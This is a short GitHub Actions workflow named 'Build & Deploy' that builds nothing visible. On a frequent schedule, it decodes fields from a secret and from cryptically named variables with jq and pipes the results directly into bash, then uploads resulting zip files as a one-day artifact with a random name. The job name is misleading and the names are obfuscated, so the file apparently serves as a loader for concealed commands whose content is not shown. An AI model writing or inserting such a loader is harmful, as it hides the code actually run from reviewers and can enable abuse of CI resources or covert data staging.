name: Build & Deploy
on:
  workflow_dispatch:

  schedule:
    - cron: '55 5,11,17,23 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Setup and run
        env:
          m446: ${{ secrets.m446 }}
        run: |
          printf '%s' "$m446" | jq -r .h7 | /bin/bash
          echo $seb8 | jq -r .nfgxm5 | /bin/bash
          printf '%s' "$hgtdd345" | jq -r .tj567 | /bin/bash
          printf '%s' "$uyu65772" | jq -r .z38 | /bin/bash

      - name: Upload data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: rz3RcPud
          path: "*.zip"
          retention-days: 1
